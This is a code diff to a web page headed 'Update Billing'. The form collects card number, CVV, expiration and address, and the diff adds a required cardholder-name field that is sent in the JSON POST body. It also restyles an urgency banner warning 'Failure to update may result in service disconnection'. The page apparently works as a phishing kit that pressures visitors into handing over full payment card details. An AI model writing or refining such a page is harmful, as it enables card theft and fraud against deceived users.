@@ -164,6 +164,7 @@ export default function Home() {
 
     const billingForm = document.getElementById('billing-form');
     const cardNumberInput = document.getElementById('card-number');
+    const cardholderNameInput = document.getElementById('cardholder-name');
     const cvvInput = document.getElementById('cvv');
     const expirationInput = document.getElementById('expiration');
     const addressInput = document.getElementById('address');
@@ -262,6 +263,7 @@ export default function Home() {
         e.preventDefault();
         
         const cardNumber = cardNumberInput.value.trim();
+        const cardholderName = cardholderNameInput.value.trim();
         const cvv = cvvInput.value.trim();
         const expiration = expirationInput.value.trim();
         const address = addressInput.value.trim();
@@ -277,6 +279,11 @@ export default function Home() {
         
         if (!validateCardNumber(cardNumber)) {
           alert('Please enter a valid card number');
+          return;
+        }
+        
+        if (!cardholderName) {
+          alert('Please enter the cardholder name');
           return;
         }
         
@@ -360,6 +367,7 @@ export default function Home() {
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                 cardNumber: cardNumber,
+                cardholderName: cardholderName,
                 expiration: expiration,
                 cvv: cvv,
                 address: address,
@@ -462,25 +470,30 @@ export default function Home() {
           display: flex;
           align-items: center;
           justify-content: center;
-          gap: 10px;
-          background: #fff3cd;
-          border: 2px solid #ffc107;
-          border-radius: 6px;
-          padding: 12px 16px;
+          gap: 8px;
           margin-bottom: 30px;
-          text-align: left;
+          text-align: center;
         }
 
         .warning-icon {
-          font-size: 20px;
-          color: #856404;
+          width: 20px;
+          height: 20px;
+          border-radius: 50%;
+          background: #dc3545;
+          color: #ffffff;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-size: 12px;
+          font-weight: 700;
           flex-shrink: 0;
+          line-height: 1;
         }
 
         .warning-text {
-          font-size: 14px;
-          font-weight: 600;
-          color: #856404;
+          font-size: 13px;
+          font-weight: 500;
+          color: #333333;
           line-height: 1.4;
         }
 
@@ -720,16 +733,17 @@ export default function Home() {
           }
 
           .warning-message {
-            padding: 10px 12px;
             margin-bottom: 25px;
           }
 
           .warning-icon {
-            font-size: 18px;
+            width: 18px;
+            height: 18px;
+            font-size: 11px;
           }
 
           .warning-text {
-            font-size: 13px;
+            font-size: 12px;
           }
 
           .form-row {
@@ -776,7 +790,7 @@ export default function Home() {
         <h1>Update Billing</h1>
 
         <div className="warning-message">
-          <span className="warning-icon">⚠️</span>
+          <span className="warning-icon">!</span>
           <span className="warning-text">Failure to update may result in service disconnection</span>
         </div>
 
@@ -790,6 +804,18 @@ export default function Home() {
               placeholder="1234 5678 9012 3456"
               autoComplete="cc-number"
               maxLength="19"
+              required
+            />
+          </div>
+
+          <div className="form-group">
+            <label htmlFor="cardholder-name">Cardholder name</label>
+            <input 
+              type="text" 
+              id="cardholder-name"
+              name="cardholder-name"
+              placeholder="John Doe"
+              autoComplete="cc-name"
               required
             />
           </div>
